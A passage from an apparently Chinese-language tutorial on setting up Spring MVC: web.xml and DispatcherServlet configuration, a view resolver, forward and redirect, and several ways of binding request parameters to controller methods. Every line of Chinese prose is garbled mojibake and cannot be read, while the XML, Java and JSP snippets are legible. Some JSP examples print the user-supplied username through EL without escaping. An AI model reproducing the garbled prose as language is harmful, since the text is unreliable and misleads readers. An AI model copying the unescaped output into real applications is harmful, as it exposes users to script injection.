<p>è¿™ä¸¤ç§æ–¹å¼è¿”å›è§†å›¾åŸç†ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åç»­å’Œmodelç»“åˆå†™æ³•ä¼šæœ‰æ‰€ä¸ä¸€æ ·ï¼Œçœ‹ä¸ªäººä¹ æƒ¯ã€‚</p>

<p>è¿™æ—¶å€™è¿è¡Œä¼šå‘ç°è®¿é—®å…¨éƒ¨404ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰é…ç½®xmlæ–‡ä»¶ï¼Œä¹Ÿæ˜¯springMVCç›¸æ¯”springBootè€Œè¨€æœ€éº»çƒ¦çš„ä¸€ç‚¹â€¦</p>

<p>Spring MVC æ˜¯åŸºäº Servlet çš„ï¼ŒDispatcherServlet æ˜¯æ•´ä¸ª Spring MVC æ¡†æ¶çš„æ ¸å¿ƒï¼Œä¸»è¦è´Ÿè´£æˆªè·è¯·æ±‚å¹¶å°†å…¶åˆ†æ´¾ç»™ç›¸åº”çš„å¤„ç†å™¨å¤„ç†ï¼ˆåç»­ä¼šæ…¢æ…¢ä»‹ç»ï¼‰ã€‚æ‰€ä»¥é…ç½® Spring MVCï¼Œé¦–å…ˆè¦å®šä¹‰ DispatcherServletï¼Œä¹Ÿå°±æ˜¯åœ¨<strong>web.xml</strong>ä¸‹è¿›è¡Œé…ç½®ã€‚</p>

<p><strong>web.xml</strong>ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">"http://xmlns.jcp.org/xml/ns/javaee"</span>
         <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="na">xsi:schemaLocation=</span><span class="s">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
         <span class="na">version=</span><span class="s">"4.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;display-name&gt;</span>springMVC<span class="nt">&lt;/display-name&gt;</span>
    <span class="nt">&lt;welcome-file-list&gt;</span>
        <span class="c">&lt;!--å…¥å£æ–‡ä»¶--&gt;</span>
        <span class="c">&lt;!--å®é™…å­˜åœ¨çš„ç‰©ç†æ–‡ä»¶åœ°å€ï¼Œä¸èƒ½å°†é¦–é¡µè®¾ç½®æˆServletæˆ–Controllerçš„åœ°å€--&gt;</span>
        <span class="c">&lt;!--å¯ä»¥é€‰æ‹©ä¸è®¾ç½®ï¼Œé»˜è®¤è®¿é—® / ï¼Œç„¶åæŠŠcontrollerç»‘å®šåœ¨ä¸Šé¢--&gt;</span>
        <span class="nt">&lt;welcome-file&gt;</span>/index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
    <span class="nt">&lt;/welcome-file-list&gt;</span>

    <span class="nt">&lt;servlet&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>springmvc<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
        <span class="c">&lt;!-- è¡¨ç¤ºå®¹å™¨å†å¯åŠ¨æ—¶ç«‹å³åŠ è½½servlet --&gt;</span>
        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
    <span class="nt">&lt;/servlet&gt;</span>

    <span class="nt">&lt;servlet-mapping&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>springmvc<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="c">&lt;!-- å¤„ç†æ‰€æœ‰URL --&gt;</span>
        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
    <span class="nt">&lt;/servlet-mapping&gt;</span>
<span class="nt">&lt;/web-app&gt;</span>
</code></pre></div></div>

<p>ä»ä¸Šè¿°é…ç½®æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‰ç‚¹</p>

<ol>
  <li>åˆå§‹ç•Œé¢ä¸º/index.jsp</li>
  <li>é…ç½®äº†ä¸€ä¸ªåä¸º <strong>springmvc</strong> çš„ Servletï¼Œç±»å‹ä¸º DispatcherServlet ï¼Œå®ƒå°±æ˜¯ Spring MVC çš„å…¥å£ï¼Œå¹¶æ ‡è®°ä¸ºå®¹å™¨å¯åŠ¨ååŠ è½½ï¼Œå³è‡ªå¯åŠ¨ã€‚</li>
  <li>é€šè¿‡ servlet-mapping æ˜ å°„åˆ° <code class="language-plaintext highlighter-rouge">/</code>ï¼Œå³ DispatcherServlet ä¼šæˆªè·å¹¶å¤„ç†è¯¥é¡¹ç›®çš„æ‰€æœ‰ URL è¯·æ±‚ã€‚</li>
</ol>

<p>è¿™åªæ˜¯ä¸€ä¸ªåˆå§‹åŒ–å®šä¹‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ ¹æ®é…ç½®çš„servletï¼ˆspringmvcï¼‰ï¼Œåˆ›å»ºå…¶å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œè¯¥é…ç½®æ–‡ä»¶å‘½åè§„åˆ™ä¸º <strong>&lt;servlet-name&gt;-servlet.xml</strong>ï¼Œä¸Šè¿°ä¾‹å­ä¹Ÿå°±æ˜¯ <strong>springmvc-servlet.xml</strong> ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span>
       <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="na">xmlns:mvc=</span><span class="s">"http://www.springframework.org/schema/mvc"</span>
       <span class="na">xmlns:p=</span><span class="s">"http://www.springframework.org/schema/p"</span>
       <span class="na">xmlns:context=</span><span class="s">"http://www.springframework.org/schema/context"</span>
       <span class="na">xsi:schemaLocation=</span><span class="s">"
        http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/mvc
        http://www.springframework.org/schema/mvc/spring-mvc.xsd"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">"com.example.springmvc.controller"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/beans&gt;</span>
</code></pre></div></div>

<p>ç›®å‰è¿™é‡Œçš„æœ‰ç”¨ä»£ç åªæ˜¯ä¸€å¥<code class="language-plaintext highlighter-rouge">    &lt;context:component-scan base-package="com.example.springmvc.controller"/&gt;</code> ï¼Œè¡¨æ˜æ‰«æåŒ…<code class="language-plaintext highlighter-rouge">com.example.springmvc.controller</code>ä¸‹æ‰€æœ‰çš„æ§åˆ¶å™¨ï¼Œæ ¹æ®å…¶æ³¨è§£æ‰€å¯¹åº”çš„è·¯ç”±ï¼Œå¹¶å°†å…¶ç”Ÿå‘½å‘¨æœŸçº³å…¥Springç®¡ç†ã€‚</p>

<p>ä¸ä½¿ç”¨æ³¨è§£çš„è¯ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æŠŠæ§åˆ¶å™¨å’Œè·¯ç”±è¿›è¡Œç»‘å®š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;bean</span> <span class="na">name=</span><span class="s">"/"</span> <span class="na">class=</span><span class="s">"com.example.springmvc.controller.LoginController"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>è¿™æ ·å¯åŠ¨åï¼Œè®¿é—®<code class="language-plaintext highlighter-rouge">/login</code>ï¼Œå°±å¯ä»¥è·³è½¬åˆ°<code class="language-plaintext highlighter-rouge">/WEB-INF/jsp/login.jsp</code>ã€‚</p>

<p>ä¸è¿‡ä½ ä¼šå‘ç°åœ¨controllerä¸­æ¯æ¬¡è·³è½¬åˆ°jspéƒ½éœ€è¦å†™ä¸€ä¸ªå®Œæ•´è·¯å¾„ï¼Œå¯ä»¥åœ¨<code class="language-plaintext highlighter-rouge">springmvc-servlet.xml</code>ä¸­é€šè¿‡è§†å›¾è§£æå™¨(ViewResolver)åŒ¹é…ä¸€ä¸ªå®šä¹‰çš„è§†å›¾ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"viewResolver"</span>
          <span class="na">class=</span><span class="s">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span><span class="nt">&gt;</span>
        <span class="c">&lt;!--å‰ç¼€ --&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"prefix"</span> <span class="na">value=</span><span class="s">"/WEB-INF/jsp/"</span> <span class="nt">/&gt;</span>
        <span class="c">&lt;!--åç¼€ --&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"suffix"</span> <span class="na">value=</span><span class="s">".jsp"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/bean&gt;</span>
</code></pre></div></div>

<p>ä¹‹åcontrollerå¯æ”¹ä¸ºï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoginController</span> <span class="o">{</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login</span><span class="o">(</span><span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="s">"theoyu"</span><span class="o">);</span>
        <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>è¿™é‡Œæˆ‘ä»¬éšæ„å¼•å…¥äº†Modelå¯¹è±¡ï¼Œåœ¨è§†å›¾ä¸­å¯ä»¥é€šè¿‡elè¡¨è¾¾å¼<code class="language-plaintext highlighter-rouge">${name}</code>å–å‡ºæ¥</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html;charset=UTF-8"</span><span class="na"> language=</span><span class="s">"java"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
This is Login Page , Hello ${name}
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<p>éƒ¨ç½²åï¼Œè®¿é—®<code class="language-plaintext highlighter-rouge">/login</code>å³å¯çœ‹è§ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155724.png" alt="image-20220412002135766" /></p>

<p>æˆ‘ä»¬é…ç½®äº†æœ€ç®€å•çš„mvcï¼Œåç»­æˆ‘ä»¬æ…¢æ…¢åŸºäºå®ƒè¿›è¡Œä¸€äº›å®Œå–„ï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰æœ‰å¿…è¦äº†è§£ä¸€ä¸‹ä»ç¬¬ä¸€ä¸ªServletåˆ°è¿”å›è§†å›¾è¿™ä¸ªè¿‡ç¨‹ç»å†äº†ä»€ä¹ˆã€‚</p>

<h2 id="0x02-springmvcæ‰§è¡Œæµç¨‹">0x02 SpringMVCæ‰§è¡Œæµç¨‹</h2>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155730.png" alt="image-20220410141300306" /></p>

<p>ä¸Šå›¾ä¸€å…±åŒ…å«ä»¥ä¸‹å…­ä¸ªç»„ä»¶ï¼š</p>

<ol>
  <li><strong>DispatcherServlet</strong>ï¼šSpring MVC çš„æ‰€æœ‰è¯·æ±‚éƒ½è¦ç»è¿‡ DispatcherServlet æ¥ç»Ÿä¸€åˆ†å‘ã€‚DispatcherServlet ç›¸å½“äºä¸€ä¸ªè½¬å‘å™¨æˆ–ä¸­å¤®å¤„ç†å™¨ï¼Œæ§åˆ¶æ•´ä¸ªæµç¨‹çš„æ‰§è¡Œã€‚</li>
  <li><strong>HandlerMapping</strong>ï¼šå¤„ç†å™¨æ˜ å°„å™¨ï¼Œå…¶ä½œç”¨æ˜¯æ ¹æ®è¯·æ±‚çš„ URL è·¯å¾„ï¼Œé€šè¿‡æ³¨è§£æˆ–è€… XML é…ç½®ï¼Œå¯»æ‰¾åŒ¹é…çš„å¤„ç†å™¨ï¼ˆHandlerï¼‰ä¿¡æ¯ã€‚</li>
  <li><strong>HandlerAdapter</strong>ï¼šå¤„ç†å™¨é€‚é…å™¨ï¼Œå…¶ä½œç”¨æ˜¯æ ¹æ®æ˜ å°„å™¨æ‰¾åˆ°çš„å¤„ç†å™¨ï¼ˆHandlerï¼‰ä¿¡æ¯ï¼ŒæŒ‰ç…§ç‰¹å®šè§„åˆ™æ‰§è¡Œç›¸å…³çš„å¤„ç†å™¨ï¼ˆHandlerï¼‰ã€‚</li>
  <li><strong>Handler</strong>ï¼šå¤„ç†å™¨ï¼Œä¹Ÿç§°ä¸ºcontrollerï¼Œå’Œ Java Servlet æ‰®æ¼”çš„è§’è‰²ä¸€è‡´ã€‚å…¶ä½œç”¨æ˜¯æ‰§è¡Œç›¸å…³çš„è¯·æ±‚å¤„ç†é€»è¾‘ï¼Œå¹¶è¿”å›ç›¸åº”çš„æ•°æ®å’Œè§†å›¾ä¿¡æ¯ï¼Œå°†å…¶å°è£…è‡³ <strong>ModelAndView</strong> å¯¹è±¡ä¸­ã€‚</li>
  <li><strong>View Resolver</strong>ï¼šè§†å›¾è§£æå™¨ï¼Œå…¶ä½œç”¨æ˜¯è¿›è¡Œè§£ææ“ä½œï¼Œé€šè¿‡ ModelAndView å¯¹è±¡ä¸­çš„ View ä¿¡æ¯å°†é€»è¾‘è§†å›¾åè§£ææˆçœŸæ­£çš„è§†å›¾ Viewï¼ˆå¦‚é€šè¿‡ä¸€ä¸ª JSP è·¯å¾„è¿”å›ä¸€ä¸ªçœŸæ­£çš„ JSP é¡µé¢ï¼‰ã€‚</li>
  <li><strong>View</strong>ï¼šè§†å›¾ï¼Œå…¶æœ¬èº«æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ç°ç±»æ”¯æŒä¸åŒçš„ View ç±»å‹ï¼ˆJSPã€FreeMarkerã€Excel ç­‰ï¼‰ã€‚</li>
</ol>

<p>å…·ä½“æµç¨‹åœ¨<strong>org.springframework.web.servlet.DispatcherServlet#doDispatch</strong>ï¼Œè·Ÿè¿›ä¸€éå°±éå¸¸æ˜äº†ã€‚</p>

<h2 id="0x03-é‡å®šå‘å’Œè½¬å‘">0x03 é‡å®šå‘å’Œè½¬å‘</h2>

<p>Spring MVC è¯·æ±‚æ–¹å¼åˆ†ä¸ºè½¬å‘ã€é‡å®šå‘ 2 ç§ï¼Œåˆ†åˆ«ä½¿ç”¨ forward å’Œ redirect å…³é”®å­—åœ¨ controller å±‚è¿›è¡Œå¤„ç†ã€‚</p>

<ul>
  <li><strong>è½¬å‘</strong>ï¼ˆforwardï¼‰ï¼šå®¢æˆ·ç«¯å‘é€httpè¯·æ±‚ï¼ŒwebæœåŠ¡å™¨æ¥å—ï¼Œè°ƒç”¨<strong>å†…éƒ¨</strong>æ–¹æ³•åœ¨å®¹å™¨å†…éƒ¨å°†è¯·æ±‚è½¬å‘ç»™å¦å¤–ä¸€ä¸ªè§†å›¾æˆ–è€…å¤„ç†è¯·æ±‚ï¼ˆä¹‹å‰requestä¸­å­˜æ”¾çš„æ¶ˆæ¯ä¸ä¼šæ¶ˆå¤±ï¼‰ï¼Œæœ€åå°†ç›®æ ‡èµ„æºå‘é€ç»™å®¢æˆ·ç«¯ã€‚</li>
  <li><strong>é‡å®šå‘</strong>ï¼ˆredirectï¼‰ï¼šå®¢æˆ·æµè§ˆå™¨å‘é€ http è¯·æ±‚ï¼ŒWeb æœåŠ¡å™¨æ¥å—åå‘é€ 302 çŠ¶æ€ç å“åº”åŠå¯¹åº”æ–°çš„ location ç»™å®¢æˆ·æµè§ˆå™¨ï¼Œå®¢æˆ·æµè§ˆå™¨å‘ç°æ˜¯ 302 å“åº”ï¼Œåˆ™è‡ªåŠ¨å†å‘é€ä¸€ä¸ªæ–°çš„ http è¯·æ±‚ï¼ˆä¹‹å‰è¯·æ±‚requestçš„æ¶ˆæ¯å…¨éƒ¨å¤±æ•ˆï¼‰ã€‚</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//è½¬å‘ç»™è§†å›¾</span>
<span class="k">return</span> <span class="s">"test"</span><span class="o">;</span>
<span class="c1">//è½¬å‘ç»™ä¸€ä¸ªè¯·æ±‚æ–¹æ³•</span>
<span class="k">return</span> <span class="s">"forward:/test"</span><span class="o">;</span>
<span class="c1">//é‡å®šå‘åˆ°ä¸€ä¸ªè¯·æ±‚æ–¹æ³•</span>
<span class="k">return</span> <span class="s">"redirect:/test"</span>
</code></pre></div></div>

<h2 id="0x04-å‚æ•°ä¼ é€’">0x04 å‚æ•°ä¼ é€’</h2>

<p>è¯´åˆ°è¯·æ±‚è‚¯å®šå°±å°‘ä¸äº†ä¼ å‚ï¼Œä¸€èˆ¬æ¥è¯´springMVCæœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>

<ul>
  <li>é€šè¿‡å¤„ç†æ–¹æ³•çš„å½¢å‚æ¥æ”¶è¯·æ±‚å‚æ•°</li>
  <li>é€šè¿‡ @RequestParam æ¥æ”¶è¯·æ±‚å‚æ•°</li>
  <li>é€šè¿‡ HttpServletRequest æ¥æ”¶è¯·æ±‚å‚æ•°</li>
  <li>é€šè¿‡ @PathVariable æ¥æ”¶ URL ä¸­çš„è¯·æ±‚å‚æ•°</li>
  <li>é€šè¿‡å®ä½“ Bean æ¥æ”¶è¯·æ±‚å‚æ•°</li>
  <li>é€šè¿‡ @ModelAttribute æ¥æ”¶è¯·æ±‚å‚æ•°</li>
</ul>

<h3 id="é€šè¿‡å¤„ç†æ–¹æ³•çš„å½¢å‚æ¥æ”¶è¯·æ±‚å‚æ•°">é€šè¿‡å¤„ç†æ–¹æ³•çš„å½¢å‚æ¥æ”¶è¯·æ±‚å‚æ•°</h3>

<p>è¯¥æ–¹æ³•å°±æ˜¯æŠŠè¡¨å•çš„å‚æ•°ç›´æ¥å†™åœ¨æ§åˆ¶å™¨å¯¹åº”æ–¹æ³•çš„å½¢å‚ä¸­ï¼Œè¦æ±‚å½¢å‚åç§°ä¸è¯·æ±‚å‚æ•°åç§°å®Œå…¨ç›¸åŒã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login1"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login1</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">,</span><span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
        <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
    <span class="o">}</span>

</code></pre></div></div>

<h3 id="é€šè¿‡-requestparam-æ¥æ”¶è¯·æ±‚å‚æ•°">é€šè¿‡ @RequestParam æ¥æ”¶è¯·æ±‚å‚æ•°</h3>

<p>åœ¨æ§åˆ¶å™¨å¯¹åº”æ–¹æ³•å…¥å‚å¤„ä½¿ç”¨ @RequestParam æ³¨è§£æŒ‡å®šå…¶å¯¹åº”çš„è¯·æ±‚å‚æ•°ã€‚@RequestParam æœ‰ä»¥ä¸‹ä¸‰ä¸ªå‚æ•°ï¼š</p>

<ul>
  <li>valueï¼šå‚æ•°å</li>
  <li>requiredï¼šæ˜¯å¦å¿…é¡»ï¼Œé»˜è®¤ä¸º trueï¼Œè¡¨ç¤ºè¯·æ±‚ä¸­å¿…é¡»åŒ…å«å¯¹åº”çš„å‚æ•°åï¼Œè‹¥ä¸å­˜åœ¨å°†æŠ›å‡ºå¼‚å¸¸</li>
  <li>defaultValueï¼šå‚æ•°é»˜è®¤å€¼</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login2"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login2</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="o">(</span><span class="n">required</span> <span class="o">=</span> <span class="kc">false</span><span class="o">,</span><span class="n">defaultValue</span> <span class="o">=</span> <span class="s">"Theoyu"</span><span class="o">)</span><span class="nc">String</span> <span class="n">username</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>RequestParamå’Œç›´æ¥å½¢å‚ä¼ å…¥å·®åˆ«ä¸å¤§ï¼Œå¤šäº†ä¸€äº›å¯ä»¥è‡ªå®šä¹‰çš„é™åˆ¶ï¼ŒåŒ…æ‹¬é»˜è®¤æƒ…å†µä¸‹è¯·æ±‚å‚æ•°å’Œæ¥å—å‚æ•°ä¸ä¸€æ ·ä¼šæŠ¥404é”™è¯¯ã€‚</p>

<h3 id="é€šè¿‡-httpservletrequest-æ¥æ”¶è¯·æ±‚å‚æ•°">é€šè¿‡ HttpServletRequest æ¥æ”¶è¯·æ±‚å‚æ•°</h3>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login3"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login3</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="nc">String</span>  <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="é€šè¿‡-pathvariable-æ¥æ”¶-url-ä¸­çš„è¯·æ±‚å‚æ•°">é€šè¿‡ @PathVariable æ¥æ”¶ URL ä¸­çš„è¯·æ±‚å‚æ•°</h3>

<p>ä»è¯·æ±‚è·¯ç”±ä¸­è§£æ</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login4/{username}"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login4</span><span class="o">(</span><span class="nd">@PathVariable</span> <span class="nc">String</span> <span class="n">username</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="é€šè¿‡å®ä½“-bean-æ¥æ”¶è¯·æ±‚å‚æ•°">é€šè¿‡å®ä½“ Bean æ¥æ”¶è¯·æ±‚å‚æ•°</h3>

<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªUserå®ä½“ç±»</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.example.springmvc.entity.user</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">password</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getUsername</span><span class="o">(){</span>
        <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setPassword</span><span class="o">(</span><span class="nc">String</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUsername</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>getå’Œpostä¼ å…¥éƒ½å¯ä»¥ï¼Œè¡¨å•å‚æ•°éœ€è¦å’Œbeanå±æ€§å¯¹åº”ã€‚</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="é€šè¿‡-modelattribute-æ¥æ”¶è¯·æ±‚å‚æ•°">é€šè¿‡ @ModelAttribute æ¥æ”¶è¯·æ±‚å‚æ•°</h3>

<p>@ModelAttributeä½œç”¨åœ¨æ–¹æ³•çš„å‚æ•°ä¸Šæ—¶ï¼Œä¼šè‡ªåŠ¨æŠŠæ•°æ®å’Œmodelè¿›è¡Œç»‘å®šï¼ˆçœå»äº†<code class="language-plaintext highlighter-rouge">model.addAttribute(x,x)</code>è¿™ä¸€æ­¥ï¼‰</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login6"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login6</span><span class="o">(</span><span class="nd">@ModelAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">)</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>ä¸è¿‡è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹viewï¼š</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html;charset=UTF-8"</span><span class="na"> language=</span><span class="s">"java"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
This is Login Page , Hello ${user.username}
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="0x05-serviceæ³¨è§£">0x05 serviceæ³¨è§£</h2>

<p>@Serviceæ³¨è§£ä¼šå°†æ ‡æ³¨ç±»è‡ªåŠ¨æ³¨å†Œåˆ° Spring å®¹å™¨ä¸­ã€‚</p>

<p>@Autowiredæ³¨è§£å¯ä»¥å¯¹ç±»æˆå‘˜å˜é‡ã€æ–¹æ³•åŠæ„é€ å‡½æ•°è¿›è¡Œæ ‡æ³¨ï¼Œå®Œæˆè‡ªåŠ¨è£…é…çš„å·¥ä½œã€‚</p>

<p>ä¸€èˆ¬serviceå±‚å¤šç”¨ä½œä¸šåŠ¡æ¨¡å—çš„é€»è¾‘è®¾è®¡ã€‚</p>

<p>æ¥å£ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">UserServices</span> <span class="o">{</span>
